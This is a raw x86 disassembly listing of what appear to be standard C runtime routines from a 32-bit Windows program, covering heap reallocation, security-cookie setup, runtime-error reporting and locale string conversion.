  425917:	jmp    0x425aa0
  42591c:	mov    esi,DWORD PTR [ebp+0xc]
  42591f:	cmp    esi,ebx
  425921:	jne    0x42592f
  425923:	push   edi
  425924:	call   0x42455a
  425929:	pop    ecx
  42592a:	jmp    0x425a9e
  42592f:	cmp    DWORD PTR ds:0x4653e4,0x3
  425936:	jne    0x425a6a
  42593c:	mov    DWORD PTR [ebp-0x1c],ebx
  42593f:	cmp    esi,0xffffffe0
  425942:	ja     0x425a39
  425948:	push   0x4
  42594a:	call   0x423b0f
  42594f:	pop    ecx
  425950:	mov    DWORD PTR [ebp-0x4],ebx
  425953:	push   edi
  425954:	call   0x424d32
  425959:	pop    ecx
  42595a:	mov    DWORD PTR [ebp-0x20],eax
  42595d:	cmp    eax,ebx
  42595f:	je     0x425a09
  425965:	cmp    esi,DWORD PTR ds:0x4651a4
  42596b:	ja     0x4259b9
  42596d:	push   esi
  42596e:	push   edi
  42596f:	push   eax
  425970:	call   0x425232
  425975:	add    esp,0xc
  425978:	test   eax,eax
  42597a:	je     0x425981
  42597c:	mov    DWORD PTR [ebp-0x1c],edi
  42597f:	jmp    0x4259b9
  425981:	push   esi
  425982:	call   0x425511
  425987:	pop    ecx
  425988:	mov    DWORD PTR [ebp-0x1c],eax
  42598b:	cmp    eax,ebx
  42598d:	je     0x4259b9
  42598f:	mov    eax,DWORD PTR [edi-0x4]
  425992:	dec    eax
  425993:	mov    DWORD PTR [ebp-0x24],eax
  425996:	cmp    eax,esi
  425998:	jb     0x42599c
  42599a:	mov    eax,esi
  42599c:	push   eax
  42599d:	push   edi
  42599e:	push   DWORD PTR [ebp-0x1c]
  4259a1:	call   0x424690
  4259a6:	push   edi
  4259a7:	call   0x424d32
  4259ac:	mov    DWORD PTR [ebp-0x20],eax
  4259af:	push   edi
  4259b0:	push   eax
  4259b1:	call   0x424d5d
  4259b6:	add    esp,0x18
  4259b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4259bc:	jne    0x425a09
  4259be:	cmp    esi,ebx
  4259c0:	jne    0x4259c8
  4259c2:	xor    esi,esi
  4259c4:	inc    esi
  4259c5:	mov    DWORD PTR [ebp+0xc],esi
  4259c8:	add    esi,0xf
  4259cb:	and    esi,0xfffffff0
  4259ce:	mov    DWORD PTR [ebp+0xc],esi
  4259d1:	push   esi
  4259d2:	push   ebx
  4259d3:	push   DWORD PTR ds:0x4653e0
  4259d9:	call   DWORD PTR ds:0x4280e4
  4259df:	mov    DWORD PTR [ebp-0x1c],eax
  4259e2:	cmp    eax,ebx
  4259e4:	je     0x425a09
  4259e6:	mov    eax,DWORD PTR [edi-0x4]
  4259e9:	dec    eax
  4259ea:	mov    DWORD PTR [ebp-0x24],eax
  4259ed:	cmp    eax,esi
  4259ef:	jb     0x4259f3
  4259f1:	mov    eax,esi
  4259f3:	push   eax
  4259f4:	push   edi
  4259f5:	push   DWORD PTR [ebp-0x1c]
  4259f8:	call   0x424690
  4259fd:	push   edi
  4259fe:	push   DWORD PTR [ebp-0x20]
  425a01:	call   0x424d5d
  425a06:	add    esp,0x14
  425a09:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a0d:	call   0x425a61
  425a12:	cmp    DWORD PTR [ebp-0x20],ebx
  425a15:	jne    0x425a39
  425a17:	cmp    esi,ebx
  425a19:	jne    0x425a1e
  425a1b:	xor    esi,esi
  425a1d:	inc    esi
  425a1e:	add    esi,0xf
  425a21:	and    esi,0xfffffff0
  425a24:	mov    DWORD PTR [ebp+0xc],esi
  425a27:	push   esi
  425a28:	push   edi
  425a29:	push   ebx
  425a2a:	push   DWORD PTR ds:0x4653e0
  425a30:	call   DWORD PTR ds:0x4280f0
  425a36:	mov    DWORD PTR [ebp-0x1c],eax
  425a39:	mov    eax,DWORD PTR [ebp-0x1c]
  425a3c:	cmp    eax,ebx
  425a3e:	jne    0x425aa0
  425a40:	cmp    DWORD PTR ds:0x465068,ebx
  425a46:	je     0x425aa0
  425a48:	push   esi
  425a49:	call   0x426232
  425a4e:	pop    ecx
  425a4f:	test   eax,eax
  425a51:	jne    0x42593c
  425a57:	jmp    0x425a9e
  425a59:	xor    ebx,ebx
  425a5b:	mov    esi,DWORD PTR [ebp+0xc]
  425a5e:	mov    edi,DWORD PTR [ebp+0x8]
  425a61:	push   0x4
  425a63:	call   0x423a7b
  425a68:	pop    ecx
  425a69:	ret    
  425a6a:	xor    eax,eax
  425a6c:	cmp    esi,0xffffffe0
  425a6f:	ja     0x425a87
  425a71:	cmp    esi,ebx
  425a73:	jne    0x425a78
  425a75:	xor    esi,esi
  425a77:	inc    esi
  425a78:	push   esi
  425a79:	push   edi
  425a7a:	push   ebx
  425a7b:	push   DWORD PTR ds:0x4653e0
  425a81:	call   DWORD PTR ds:0x4280f0
  425a87:	cmp    eax,ebx
  425a89:	jne    0x425aa0
  425a8b:	cmp    DWORD PTR ds:0x465068,ebx
  425a91:	je     0x425aa0
  425a93:	push   esi
  425a94:	call   0x426232
  425a99:	pop    ecx
  425a9a:	test   eax,eax
  425a9c:	jne    0x425a6a
  425a9e:	xor    eax,eax
  425aa0:	call   0x42398b
  425aa5:	ret    
  425aa6:	push   0x10
  425aa8:	push   0x4287d0
  425aad:	call   0x423950
  425ab2:	cmp    DWORD PTR ds:0x4653e4,0x3
  425ab9:	jne    0x425af5
  425abb:	push   0x4
  425abd:	call   0x423b0f
  425ac2:	pop    ecx
  425ac3:	and    DWORD PTR [ebp-0x4],0x0
  425ac7:	mov    esi,DWORD PTR [ebp+0x8]
  425aca:	push   esi
  425acb:	call   0x424d32
  425ad0:	pop    ecx
  425ad1:	mov    DWORD PTR [ebp-0x1c],eax
  425ad4:	test   eax,eax
  425ad6:	je     0x425ae3
  425ad8:	mov    esi,DWORD PTR [esi-0x4]
  425adb:	sub    esi,0x9
  425ade:	mov    DWORD PTR [ebp-0x20],esi
  425ae1:	jmp    0x425ae6
  425ae3:	mov    esi,DWORD PTR [ebp-0x20]
  425ae6:	or     DWORD PTR [ebp-0x4],0xffffffff
  425aea:	call   0x425b13
  425aef:	cmp    DWORD PTR [ebp-0x1c],0x0
  425af3:	jne    0x425b08
  425af5:	push   DWORD PTR [ebp+0x8]
  425af8:	push   0x0
  425afa:	push   DWORD PTR ds:0x4653e0
  425b00:	call   DWORD PTR ds:0x4280f4
  425b06:	mov    esi,eax
  425b08:	mov    eax,esi
  425b0a:	call   0x42398b
  425b0f:	ret    
  425b10:	mov    esi,DWORD PTR [ebp-0x20]
  425b13:	push   0x4
  425b15:	call   0x423a7b
  425b1a:	pop    ecx
  425b1b:	ret    
  425b1c:	push   ebp
  425b1d:	mov    ebp,esp
  425b1f:	sub    esp,0x10
  425b22:	push   esi
  425b23:	lea    eax,[ebp-0x8]
  425b26:	push   eax
  425b27:	call   DWORD PTR ds:0x428104
  425b2d:	mov    esi,DWORD PTR [ebp-0x4]
  425b30:	xor    esi,DWORD PTR [ebp-0x8]
  425b33:	call   DWORD PTR ds:0x428100
  425b39:	xor    esi,eax
  425b3b:	call   DWORD PTR ds:0x4280ac
  425b41:	xor    esi,eax
  425b43:	call   DWORD PTR ds:0x4280fc
  425b49:	xor    esi,eax
  425b4b:	lea    eax,[ebp-0x10]
  425b4e:	push   eax
  425b4f:	call   DWORD PTR ds:0x4280f8
  425b55:	mov    eax,DWORD PTR [ebp-0xc]
  425b58:	xor    eax,DWORD PTR [ebp-0x10]
  425b5b:	xor    esi,eax
  425b5d:	mov    DWORD PTR ds:0x4646c0,esi
  425b63:	jne    0x425b6f
  425b65:	mov    DWORD PTR ds:0x4646c0,0xbb40e64e
  425b6f:	pop    esi
  425b70:	leave  
  425b71:	ret    
  425b72:	push   0x118
  425b77:	push   0x428980
  425b7c:	call   0x423950
  425b81:	mov    eax,ds:0x4646c0
  425b86:	xor    eax,DWORD PTR [ebp+0x4]
  425b89:	mov    DWORD PTR [ebp-0x1c],eax
  425b8c:	mov    eax,ds:0x465038
  425b91:	xor    ecx,ecx
  425b93:	cmp    eax,ecx
  425b95:	je     0x425bb6
  425b97:	mov    DWORD PTR [ebp-0x4],ecx
  425b9a:	push   DWORD PTR [ebp+0xc]
  425b9d:	push   DWORD PTR [ebp+0x8]
  425ba0:	call   eax
  425ba2:	pop    ecx
  425ba3:	pop    ecx
  425ba4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ba8:	jmp    0x425cb4
  425bad:	xor    eax,eax
  425baf:	inc    eax
  425bb0:	ret    
  425bb1:	mov    esp,DWORD PTR [ebp-0x18]
  425bb4:	jmp    0x425ba4
  425bb6:	mov    eax,DWORD PTR [ebp+0x8]
  425bb9:	dec    eax
  425bba:	je     0x425bcf
  425bbc:	mov    edi,0x42895c
  425bc1:	mov    DWORD PTR [ebp-0x20],0x4288a8
  425bc8:	mov    esi,0xd4
  425bcd:	jmp    0x425be0
  425bcf:	mov    edi,0x428888
  425bd4:	mov    DWORD PTR [ebp-0x20],0x4287e8
  425bdb:	mov    esi,0xb9
  425be0:	mov    BYTE PTR [ebp-0x24],cl
  425be3:	push   0x104
  425be8:	lea    eax,[ebp-0x128]
  425bee:	push   eax
  425bef:	push   ecx
  425bf0:	call   DWORD PTR ds:0x428080
  425bf6:	test   eax,eax
  425bf8:	jne    0x425c0d
  425bfa:	push   0x4284dc
  425bff:	lea    eax,[ebp-0x128]
  425c05:	push   eax
  425c06:	call   0x423d30
  425c0b:	pop    ecx
  425c0c:	pop    ecx
  425c0d:	lea    ebx,[ebp-0x128]
  425c13:	lea    eax,[ebp-0x128]
  425c19:	push   eax
  425c1a:	call   0x423f60
  425c1f:	pop    ecx
  425c20:	add    eax,0xb
  425c23:	cmp    eax,0x3c
  425c26:	jbe    0x425c51
  425c28:	lea    eax,[ebp-0x128]
  425c2e:	push   eax
  425c2f:	call   0x423f60
  425c34:	mov    ebx,eax
  425c36:	lea    eax,[ebp-0x128]
  425c3c:	sub    eax,0x31
  425c3f:	add    ebx,eax
  425c41:	push   0x3
  425c43:	push   0x4284d8
  425c48:	push   ebx
  425c49:	call   0x423e30
  425c4e:	add    esp,0x10
  425c51:	push   ebx
  425c52:	call   0x423f60
  425c57:	pop    ecx
  425c58:	lea    eax,[eax+esi*1+0xc]
  425c5c:	add    eax,0x3
  425c5f:	and    eax,0xfffffffc
  425c62:	call   0x4239a0
  425c67:	mov    DWORD PTR [ebp-0x18],esp
  425c6a:	mov    esi,esp
  425c6c:	push   edi
  425c6d:	push   esi
  425c6e:	call   0x423d30
  425c73:	mov    edi,0x4284b8
  425c78:	push   edi
  425c79:	push   esi
  425c7a:	call   0x423d40
  425c7f:	push   0x4287dc
  425c84:	push   esi
  425c85:	call   0x423d40
  425c8a:	push   ebx
  425c8b:	push   esi
  425c8c:	call   0x423d40
  425c91:	push   edi
  425c92:	push   esi
  425c93:	call   0x423d40
  425c98:	push   DWORD PTR [ebp-0x20]
  425c9b:	push   esi
  425c9c:	call   0x423d40
  425ca1:	push   0x12010
  425ca6:	push   0x428490
  425cab:	push   esi
  425cac:	call   0x423c32
  425cb1:	add    esp,0x3c
  425cb4:	push   0x3
  425cb6:	call   0x422dbc
  425cbb:	int3   
  425cbc:	push   0x38
  425cbe:	push   0x428da0
  425cc3:	call   0x423950
  425cc8:	xor    ebx,ebx
  425cca:	cmp    DWORD PTR ds:0x46505c,ebx
  425cd0:	jne    0x425d0a
  425cd2:	push   ebx
  425cd3:	push   ebx
  425cd4:	xor    esi,esi
  425cd6:	inc    esi
  425cd7:	push   esi
  425cd8:	push   0x428d9c
  425cdd:	push   0x100
  425ce2:	push   ebx
  425ce3:	call   DWORD PTR ds:0x428110
  425ce9:	test   eax,eax
  425ceb:	je     0x425cf5
  425ced:	mov    DWORD PTR ds:0x46505c,esi
  425cf3:	jmp    0x425d0a
  425cf5:	call   DWORD PTR ds:0x428034
  425cfb:	cmp    eax,0x78
  425cfe:	jne    0x425d0a
  425d00:	mov    DWORD PTR ds:0x46505c,0x2
  425d0a:	cmp    DWORD PTR [ebp+0x14],ebx
  425d0d:	jle    0x425d2a
  425d0f:	mov    ecx,DWORD PTR [ebp+0x14]
  425d12:	mov    eax,DWORD PTR [ebp+0x10]
  425d15:	dec    ecx
  425d16:	cmp    BYTE PTR [eax],bl
  425d18:	je     0x425d22
  425d1a:	inc    eax
  425d1b:	cmp    ecx,ebx
  425d1d:	jne    0x425d15
  425d1f:	or     ecx,0xffffffff
  425d22:	or     eax,0xffffffff
  425d25:	sub    eax,ecx
  425d27:	add    DWORD PTR [ebp+0x14],eax
  425d2a:	mov    eax,ds:0x46505c
  425d2f:	cmp    eax,0x2
  425d32:	je     0x425f14
  425d38:	cmp    eax,ebx
  425d3a:	je     0x425f14
  425d40:	cmp    eax,0x1
  425d43:	jne    0x425f47
  425d49:	xor    edi,edi
  425d4b:	mov    DWORD PTR [ebp-0x1c],edi
  425d4e:	mov    DWORD PTR [ebp-0x20],ebx
  425d51:	mov    DWORD PTR [ebp-0x24],ebx
  425d54:	cmp    DWORD PTR [ebp+0x20],ebx
  425d57:	jne    0x425d61
  425d59:	mov    eax,ds:0x465054
  425d5e:	mov    DWORD PTR [ebp+0x20],eax
  425d61:	push   ebx
  425d62:	push   ebx
  425d63:	push   DWORD PTR [ebp+0x14]
  425d66:	push   DWORD PTR [ebp+0x10]
  425d69:	xor    eax,eax
  425d6b:	cmp    DWORD PTR [ebp+0x24],ebx
  425d6e:	setne  al
  425d71:	lea    eax,[eax*8+0x1]
  425d78:	push   eax
  425d79:	push   DWORD PTR [ebp+0x20]
  425d7c:	call   DWORD PTR ds:0x42810c
  425d82:	mov    esi,eax
  425d84:	mov    DWORD PTR [ebp-0x28],esi
  425d87:	cmp    esi,ebx
  425d89:	je     0x425f47
  425d8f:	mov    DWORD PTR [ebp-0x4],0x1
  425d96:	lea    eax,[esi+esi*1]
  425d99:	add    eax,0x3
  425d9c:	and    eax,0xfffffffc
  425d9f:	call   0x4239a0
  425da4:	mov    DWORD PTR [ebp-0x18],esp
  425da7:	mov    eax,esp
  425da9:	mov    DWORD PTR [ebp-0x2c],eax
  425dac:	or     DWORD PTR [ebp-0x4],0xffffffff
  425db0:	jmp    0x425dcd
  425db2:	xor    eax,eax
  425db4:	inc    eax
  425db5:	ret    
  425db6:	mov    esp,DWORD PTR [ebp-0x18]
  425db9:	call   0x426de5
  425dbe:	xor    ebx,ebx
  425dc0:	mov    DWORD PTR [ebp-0x2c],ebx
  425dc3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dc7:	mov    edi,DWORD PTR [ebp-0x1c]
  425dca:	mov    esi,DWORD PTR [ebp-0x28]
  425dcd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425dd0:	jne    0x425dee
  425dd2:	lea    eax,[esi+esi*1]
  425dd5:	push   eax
  425dd6:	call   0x424672
  425ddb:	pop    ecx
  425ddc:	mov    DWORD PTR [ebp-0x2c],eax
  425ddf:	cmp    eax,ebx
  425de1:	je     0x425f47
  425de7:	mov    DWORD PTR [ebp-0x20],0x1
  425dee:	push   esi
  425def:	push   DWORD PTR [ebp-0x2c]
  425df2:	push   DWORD PTR [ebp+0x14]
  425df5:	push   DWORD PTR [ebp+0x10]
  425df8:	push   0x1
  425dfa:	push   DWORD PTR [ebp+0x20]
  425dfd:	call   DWORD PTR ds:0x42810c
  425e03:	test   eax,eax
  425e05:	je     0x425ef1
  425e0b:	push   ebx
  425e0c:	push   ebx
  425e0d:	push   esi
  425e0e:	push   DWORD PTR [ebp-0x2c]
  425e11:	push   DWORD PTR [ebp+0xc]
  425e14:	push   DWORD PTR [ebp+0x8]
  425e17:	call   DWORD PTR ds:0x428110
  425e1d:	mov    edi,eax
  425e1f:	mov    DWORD PTR [ebp-0x1c],edi
  425e22:	cmp    edi,ebx
  425e24:	je     0x425ef1
  425e2a:	test   BYTE PTR [ebp+0xd],0x4
  425e2e:	je     0x425e5d
  425e30:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e33:	je     0x425ef1
  425e39:	cmp    edi,DWORD PTR [ebp+0x1c]
  425e3c:	jg     0x425ef1
  425e42:	push   DWORD PTR [ebp+0x1c]
  425e45:	push   DWORD PTR [ebp+0x18]
  425e48:	push   esi
  425e49:	push   DWORD PTR [ebp-0x2c]
  425e4c:	push   DWORD PTR [ebp+0xc]
  425e4f:	push   DWORD PTR [ebp+0x8]
  425e52:	call   DWORD PTR ds:0x428110
  425e58:	jmp    0x425ef1
  425e5d:	mov    DWORD PTR [ebp-0x4],0x2
  425e64:	lea    eax,[edi+edi*1]
  425e67:	add    eax,0x3
  425e6a:	and    eax,0xfffffffc
  425e6d:	call   0x4239a0
  425e72:	mov    DWORD PTR [ebp-0x18],esp
  425e75:	mov    eax,esp
  425e77:	mov    DWORD PTR [ebp-0x30],eax
  425e7a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e7e:	jmp    0x425e9b
  425e80:	xor    eax,eax
  425e82:	inc    eax
  425e83:	ret    
  425e84:	mov    esp,DWORD PTR [ebp-0x18]
  425e87:	call   0x426de5
  425e8c:	xor    ebx,ebx
  425e8e:	mov    DWORD PTR [ebp-0x30],ebx
  425e91:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e95:	mov    edi,DWORD PTR [ebp-0x1c]
  425e98:	mov    esi,DWORD PTR [ebp-0x28]
  425e9b:	cmp    DWORD PTR [ebp-0x30],ebx
  425e9e:	jne    0x425eb8
  425ea0:	lea    eax,[edi+edi*1]
  425ea3:	push   eax
  425ea4:	call   0x424672
  425ea9:	pop    ecx
  425eaa:	mov    DWORD PTR [ebp-0x30],eax
  425ead:	cmp    eax,ebx
  425eaf:	je     0x425ef1
  425eb1:	mov    DWORD PTR [ebp-0x24],0x1
  425eb8:	push   edi
  425eb9:	push   DWORD PTR [ebp-0x30]
  425ebc:	push   esi
  425ebd:	push   DWORD PTR [ebp-0x2c]
  425ec0:	push   DWORD PTR [ebp+0xc]
  425ec3:	push   DWORD PTR [ebp+0x8]
  425ec6:	call   DWORD PTR ds:0x428110
  425ecc:	test   eax,eax
  425ece:	je     0x425ef1
  425ed0:	push   ebx
  425ed1:	push   ebx
  425ed2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425ed5:	jne    0x425edb
  425ed7:	push   ebx
  425ed8:	push   ebx
  425ed9:	jmp    0x425ee1
  425edb:	push   DWORD PTR [ebp+0x1c]
  425ede:	push   DWORD PTR [ebp+0x18]
  425ee1:	push   edi
  425ee2:	push   DWORD PTR [ebp-0x30]
  425ee5:	push   ebx
  425ee6:	push   DWORD PTR [ebp+0x20]
  425ee9:	call   DWORD PTR ds:0x428090
  425eef:	mov    edi,eax
  425ef1:	cmp    DWORD PTR [ebp-0x24],ebx
  425ef4:	je     0x425eff
  425ef6:	push   DWORD PTR [ebp-0x30]
  425ef9:	call   0x42455a
  425efe:	pop    ecx
  425eff:	cmp    DWORD PTR [ebp-0x20],ebx
  425f02:	je     0x425f0d
  425f04:	push   DWORD PTR [ebp-0x2c]
  425f07:	call   0x42455a
  425f0c:	pop    ecx
  425f0d:	mov    eax,edi
  425f0f:	jmp    0x42606f
  425f14:	mov    DWORD PTR [ebp-0x34],ebx
  425f17:	xor    edi,edi
  425f19:	mov    DWORD PTR [ebp-0x38],ebx
  425f1c:	cmp    DWORD PTR [ebp+0x8],ebx
  425f1f:	jne    0x425f29
  425f21:	mov    eax,ds:0x465044
  425f26:	mov    DWORD PTR [ebp+0x8],eax
  425f29:	cmp    DWORD PTR [ebp+0x20],ebx
  425f2c:	jne    0x425f36
  425f2e:	mov    eax,ds:0x465054
  425f33:	mov    DWORD PTR [ebp+0x20],eax
  425f36:	push   DWORD PTR [ebp+0x8]
  425f39:	call   0x426bcd
  425f3e:	pop    ecx
  425f3f:	mov    DWORD PTR [ebp-0x3c],eax
  425f42:	cmp    eax,0xffffffff
  425f45:	jne    0x425f4e
  425f47:	xor    eax,eax
  425f49:	jmp    0x42606f
  425f4e:	cmp    eax,DWORD PTR [ebp+0x20]
  425f51:	je     0x426045
  425f57:	push   ebx
  425f58:	push   ebx
  425f59:	lea    ecx,[ebp+0x14]
  425f5c:	push   ecx
  425f5d:	push   DWORD PTR [ebp+0x10]
  425f60:	push   eax
  425f61:	push   DWORD PTR [ebp+0x20]
  425f64:	call   0x426c16
  425f69:	add    esp,0x18
  425f6c:	mov    DWORD PTR [ebp-0x34],eax
  425f6f:	cmp    eax,ebx
  425f71:	je     0x425f47
  425f73:	push   ebx
  425f74:	push   ebx
  425f75:	push   DWORD PTR [ebp+0x14]
  425f78:	push   eax
  425f79:	push   DWORD PTR [ebp+0xc]
  425f7c:	push   DWORD PTR [ebp+0x8]
  425f7f:	call   DWORD PTR ds:0x428108
  425f85:	mov    esi,eax
  425f87:	mov    DWORD PTR [ebp-0x40],esi
  425f8a:	cmp    esi,ebx
  425f8c:	je     0x426034
  425f92:	mov    DWORD PTR [ebp-0x4],ebx
  425f95:	add    eax,0x3
  425f98:	and    eax,0xfffffffc
  425f9b:	call   0x4239a0
  425fa0:	mov    DWORD PTR [ebp-0x18],esp
  425fa3:	mov    edi,esp
  425fa5:	mov    DWORD PTR [ebp-0x44],edi
  425fa8:	push   esi
  425fa9:	push   ebx
  425faa:	push   edi
  425fab:	call   0x426250
  425fb0:	add    esp,0xc
  425fb3:	jmp    0x425fc5
  425fb5:	xor    eax,eax
  425fb7:	inc    eax
  425fb8:	ret    
  425fb9:	mov    esp,DWORD PTR [ebp-0x18]
  425fbc:	call   0x426de5
  425fc1:	xor    ebx,ebx
  425fc3:	xor    edi,edi
  425fc5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425fc9:	cmp    edi,ebx
  425fcb:	jne    0x425ff0
  425fcd:	push   DWORD PTR [ebp-0x40]
  425fd0:	call   0x424672
  425fd5:	pop    ecx
  425fd6:	mov    edi,eax
  425fd8:	cmp    edi,ebx
  425fda:	je     0x42600d
  425fdc:	push   DWORD PTR [ebp-0x40]
  425fdf:	push   ebx
  425fe0:	push   edi
  425fe1:	call   0x426250
  425fe6:	add    esp,0xc
  425fe9:	mov    DWORD PTR [ebp-0x38],0x1
  425ff0:	push   DWORD PTR [ebp-0x40]
  425ff3:	push   edi
  425ff4:	push   DWORD PTR [ebp+0x14]
  425ff7:	push   DWORD PTR [ebp-0x34]
  425ffa:	push   DWORD PTR [ebp+0xc]
  425ffd:	push   DWORD PTR [ebp+0x8]
  426000:	call   DWORD PTR ds:0x428108
  426006:	mov    DWORD PTR [ebp-0x40],eax
  426009:	cmp    eax,ebx
  42600b:	jne    0x426011
  42600d:	xor    esi,esi
  42600f:	jmp    0x426037
  426011:	push   DWORD PTR [ebp+0x1c]
  426014:	push   DWORD PTR [ebp+0x18]
  426017:	lea    eax,[ebp-0x40]
  42601a:	push   eax
  42601b:	push   edi
  42601c:	push   DWORD PTR [ebp+0x20]
  42601f:	push   DWORD PTR [ebp-0x3c]
  426022:	call   0x426c16
  426027:	add    esp,0x18
  42602a:	mov    esi,eax
  42602c:	neg    esi
  42602e:	sbb    esi,esi
  426030:	neg    esi
  426032:	jmp    0x426037
  426034:	mov    esi,DWORD PTR [ebp-0x48]
  426037:	cmp    DWORD PTR [ebp-0x38],ebx
  42603a:	je     0x42605f
  42603c:	push   edi
  42603d:	call   0x42455a
  426042:	pop    ecx
  426043:	jmp    0x42605f
  426045:	push   DWORD PTR [ebp+0x1c]
  426048:	push   DWORD PTR [ebp+0x18]
  42604b:	push   DWORD PTR [ebp+0x14]
  42604e:	push   DWORD PTR [ebp+0x10]
  426051:	push   DWORD PTR [ebp+0xc]
  426054:	push   DWORD PTR [ebp+0x8]
  426057:	call   DWORD PTR ds:0x428108
  42605d:	mov    esi,eax
  42605f:	cmp    DWORD PTR [ebp-0x34],ebx
  426062:	je     0x42606d
  426064:	push   DWORD PTR [ebp-0x34]
  426067:	call   0x42455a
  42606c:	pop    ecx
  42606d:	mov    eax,esi
  42606f:	lea    esp,[ebp-0x54]
  426072:	call   0x42398b
  426077:	ret    
  426078:	push   0x1c
  42607a:	push   0x428dc8
  42607f:	call   0x423950
  426084:	xor    esi,esi
  426086:	cmp    DWORD PTR ds:0x465060,esi
  42608c:	jne    0x4260c3
  42608e:	lea    eax,[ebp-0x1c]
  426091:	push   eax
  426092:	xor    edi,edi
  426094:	inc    edi
  426095:	push   edi
  426096:	push   0x428d9c
  42609b:	push   edi
  42609c:	call   DWORD PTR ds:0x428118
  4260a2:	test   eax,eax
  4260a4:	je     0x4260ae
  4260a6:	mov    DWORD PTR ds:0x465060,edi
  4260ac:	jmp    0x4260c3
  4260ae:	call   DWORD PTR ds:0x428034
  4260b4:	cmp    eax,0x78
  4260b7:	jne    0x4260c3
  4260b9:	mov    DWORD PTR ds:0x465060,0x2
  4260c3:	mov    eax,ds:0x465060
  4260c8:	cmp    eax,0x2
  4260cb:	je     0x4261bb
  4260d1:	cmp    eax,esi
  4260d3:	je     0x4261bb
  4260d9:	cmp    eax,0x1
  4260dc:	jne    0x4261e1
  4260e2:	mov    DWORD PTR [ebp-0x20],esi
  4260e5:	mov    DWORD PTR [ebp-0x24],esi
  4260e8:	cmp    DWORD PTR [ebp+0x18],esi
  4260eb:	jne    0x4260f5
  4260ed:	mov    eax,ds:0x465054
  4260f2:	mov    DWORD PTR [ebp+0x18],eax
  4260f5:	push   esi
  4260f6:	push   esi
  4260f7:	push   DWORD PTR [ebp+0x10]
  4260fa:	push   DWORD PTR [ebp+0xc]
  4260fd:	xor    eax,eax
  4260ff:	cmp    DWORD PTR [ebp+0x20],esi
  426102:	setne  al
  426105:	lea    eax,[eax*8+0x1]
  42610c:	push   eax
  42610d:	push   DWORD PTR [ebp+0x18]
  426110:	call   DWORD PTR ds:0x42810c
  426116:	mov    edi,eax
  426118:	mov    DWORD PTR [ebp-0x28],edi
  42611b:	test   edi,edi
  42611d:	je     0x4261e1
  426123:	and    DWORD PTR [ebp-0x4],0x0
  426127:	lea    ebx,[edi+edi*1]
  42612a:	mov    eax,ebx
  42612c:	add    eax,0x3
  42612f:	and    eax,0xfffffffc
  426132:	call   0x4239a0
  426137:	mov    DWORD PTR [ebp-0x18],esp
  42613a:	mov    esi,esp
  42613c:	mov    DWORD PTR [ebp-0x2c],esi
  42613f:	push   ebx
  426140:	push   0x0
  426142:	push   esi
  426143:	call   0x426250
  426148:	add    esp,0xc
  42614b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42614f:	jmp    0x426166
  426151:	xor    eax,eax
  426153:	inc    eax
  426154:	ret    
  426155:	mov    esp,DWORD PTR [ebp-0x18]
  426158:	call   0x426de5
  42615d:	xor    esi,esi
  42615f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426163:	mov    edi,DWORD PTR [ebp-0x28]
  426166:	test   esi,esi
  426168:	jne    0x426181
  42616a:	push   edi
  42616b:	push   0x2
  42616d:	call   0x424a68
  426172:	pop    ecx
  426173:	pop    ecx
  426174:	mov    esi,eax
  426176:	test   esi,esi
  426178:	je     0x4261e1
  42617a:	mov    DWORD PTR [ebp-0x24],0x1
  426181:	push   edi
  426182:	push   esi
  426183:	push   DWORD PTR [ebp+0x10]
  426186:	push   DWORD PTR [ebp+0xc]
  426189:	push   0x1
  42618b:	push   DWORD PTR [ebp+0x18]
  42618e:	call   DWORD PTR ds:0x42810c
  426194:	test   eax,eax
  426196:	je     0x4261a9
  426198:	push   DWORD PTR [ebp+0x14]
  42619b:	push   eax
  42619c:	push   esi
  42619d:	push   DWORD PTR [ebp+0x8]
  4261a0:	call   DWORD PTR ds:0x428118
  4261a6:	mov    DWORD PTR [ebp-0x20],eax
  4261a9:	cmp    DWORD PTR [ebp-0x24],0x0
  4261ad:	je     0x4261b6
  4261af:	push   esi
  4261b0:	call   0x42455a
  4261b5:	pop    ecx
  4261b6:	mov    eax,DWORD PTR [ebp-0x20]
  4261b9:	jmp    0x426229
  4261bb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4261be:	cmp    ebx,esi
  4261c0:	jne    0x4261c8
  4261c2:	mov    ebx,DWORD PTR ds:0x465044
  4261c8:	mov    edi,DWORD PTR [ebp+0x18]
  4261cb:	test   edi,edi
  4261cd:	jne    0x4261d5
  4261cf:	mov    edi,DWORD PTR ds:0x465054
  4261d5:	push   ebx
  4261d6:	call   0x426bcd
  4261db:	pop    ecx
  4261dc:	cmp    eax,0xffffffff
  4261df:	jne    0x4261e5
  4261e1:	xor    eax,eax
  4261e3:	jmp    0x426229
  4261e5:	cmp    eax,edi
  4261e7:	je     0x426207
  4261e9:	push   0x0
  4261eb:	push   0x0
  4261ed:	lea    ecx,[ebp+0x10]
  4261f0:	push   ecx
  4261f1:	push   DWORD PTR [ebp+0xc]
  4261f4:	push   eax
  4261f5:	push   edi
  4261f6:	call   0x426c16
  4261fb:	add    esp,0x18
  4261fe:	mov    esi,eax
  426200:	test   esi,esi
  426202:	je     0x4261e1
  426204:	mov    DWORD PTR [ebp+0xc],esi
  426207:	push   DWORD PTR [ebp+0x14]
  42620a:	push   DWORD PTR [ebp+0x10]
  42620d:	push   DWORD PTR [ebp+0xc]
  426210:	push   DWORD PTR [ebp+0x8]
  426213:	push   ebx
  426214:	call   DWORD PTR ds:0x428114
  42621a:	mov    edi,eax
  42621c:	test   esi,esi
  42621e:	je     0x426227
  426220:	push   esi
  426221:	call   0x42455a
  426226:	pop    ecx
  426227:	mov    eax,edi
  426229:	lea    esp,[ebp-0x38]
  42622c:	call   0x42398b
  426231:	ret    
  426232:	mov    eax,ds:0x465064
  426237:	test   eax,eax
  426239:	je     0x42624a
  42623b:	push   DWORD PTR [esp+0x4]
  42623f:	call   eax
  426241:	test   eax,eax
  426243:	pop    ecx
  426244:	je     0x42624a
  426246:	xor    eax,eax
  426248:	inc    eax
  426249:	ret    
  42624a:	xor    eax,eax
